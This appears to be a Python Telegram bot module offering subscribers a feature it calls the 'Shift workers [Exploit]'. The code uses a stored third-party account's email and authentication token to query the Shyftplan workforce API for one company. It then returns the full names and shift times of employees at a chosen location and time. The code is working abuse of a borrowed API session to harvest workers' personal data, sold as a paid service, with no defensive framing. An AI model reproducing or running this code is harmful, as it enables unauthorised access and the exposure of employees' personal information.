# Version 1.0.0 release

import configparser
import json
import mysql.connector as mysql
import pytz
import requests
from aiogram import Router, types
from aiogram.filters import Text
from aiogram.fsm.context import FSMContext
from aiogram.filters.state import State, StatesGroup
from datetime import datetime

from bot_keyboards import create_menu_keyboard, create_menu_button_keyboard
from tools import config_data, db, work_data

router = Router()


class WaitPrompt(StatesGroup):
    waiting_for_prompt = State()


@router.message(Text(text="ðŸ’¥ Shift workers [Exploit]"))
async def shift_workers_exploit(message: types.Message, state: FSMContext) -> None:
    db_data = config_data.get_db(configparser.ConfigParser())
    db_connect = mysql.connect(user="root",
                               host=db_data["ip"],
                               port=db_data["port"],
                               password=db_data["password"])
    user_data = db.users_get_user(conn=db_connect, user_id=message.from_user.id)
    sp_user_data = db.sp_users_get_user(conn=db_connect, sp_uid=user_data["sp_uid"])
    if sp_user_data["subscription"] == "admin" or \
       (sp_user_data["subscription"] == "friend" and datetime.now() < sp_user_data["expire"]):
        await state.set_state(WaitPrompt.waiting_for_prompt)
        keyboard = await create_menu_button_keyboard()
        await message.answer("ðŸ’¥ This exploit allows you to get a list of workers on a shift.\n\n"
                             "For use enter the prompt indicating the first word of the DS in Latin, "
                             "then date (dd.mm.yyyy) and time (hh:mm-hh:mm), separating it with a slash \"/\".\n\n"
                             "Example: <code>szarych/01.01.2022/19:00-23:30</code>",
                             reply_markup=keyboard, parse_mode="HTML")

    db_connect.close()


@router.message(WaitPrompt.waiting_for_prompt)
async def prompt_waiting(message: types.Message, state: FSMContext) -> None:
    db_data = config_data.get_db(configparser.ConfigParser())
    db_connect = mysql.connect(user="root",
                               host=db_data["ip"],
                               port=db_data["port"],
                               password=db_data["password"])
    user_data = db.users_get_user(conn=db_connect, user_id=message.from_user.id)
    sp_user_data = db.sp_users_get_user(conn=db_connect, sp_uid=user_data["sp_uid"])

    # Prompt user for input
    location_name, date_str, shift_time_str = message.text.split("/")
    date = datetime.strptime(date_str, '%d.%m.%Y')
    start_time, end_time = map(datetime.strptime, shift_time_str.split("-"), ['%H:%M'] * 2)

    # Convert shift times to ISO format with timezone information
    timezone = pytz.timezone('Europe/Warsaw')
    start_iso = timezone.localize(datetime.combine(date.date(), start_time.time())).isoformat()
    end_iso = timezone.localize(datetime.combine(date.date(), end_time.time())).isoformat()

    # Construct API request parameters
    user_for_exploit = config_data.get_user_for_exploit(configparser.ConfigParser())
    params = {
        "user_email": user_for_exploit["user_email"],
        "authentication_token": user_for_exploit["user_token"],
        "company_id": 50272,
        "page": 1,
        "per_page": 100,
        "starts_at": start_iso,
        "ends_at": end_iso,
        "locations_position_ids[]": []
    }

    # Find location in data sample and add vehicle IDs to request parameters
    location_sample = work_data.locations_sample
    for location in location_sample:
        if location["name"] == location_name:
            for ids in location["ids"].values():
                params["locations_position_ids[]"].extend(ids)
            break

    # Send API request and parse response JSON
    response = requests.get("https://shyftplan.com/api/v1/evaluations", params=params)
    page_json = json.loads(response.text)

    # Create list of employees and their shift information
    shift_employees = {}
    for item in page_json["items"]:
        vehicle_emoji = "ðŸš²" if item["locations_position_id"] in location["ids"]["bike"] and "skuterze" not in item[
            "shift_note"] else "ðŸš—" if item["locations_position_id"] in location["ids"]["car"] else "ðŸ›µ"
        shift_times = f"{vehicle_emoji} {datetime.fromisoformat(item['evaluation_starts_at']).strftime('%H:%M')}-{datetime.fromisoformat(item['evaluation_ends_at']).strftime('%H:%M')}"
        if item["employment_id"] in shift_employees:
            shift_employees[item["employment_id"]]["shifts"].append(shift_times)
        else:
            shift_employees[item["employment_id"]] = {"name": f"{item['first_name']} {item['last_name']}",
                                                      "vehicle_emoji": vehicle_emoji, "shifts": [shift_times]}

    # Construct reply message
    reply_message = "\n".join([f"ðŸ•“ [{', '.join(info['shifts'])}] <b>{info['name']}</b>" for info in shift_employees.values()])

    keyboard = await create_menu_keyboard(sp_user_data=sp_user_data)
    await message.answer(reply_message, reply_markup=keyboard, parse_mode="HTML")

    await state.clear()
    db_connect.close()
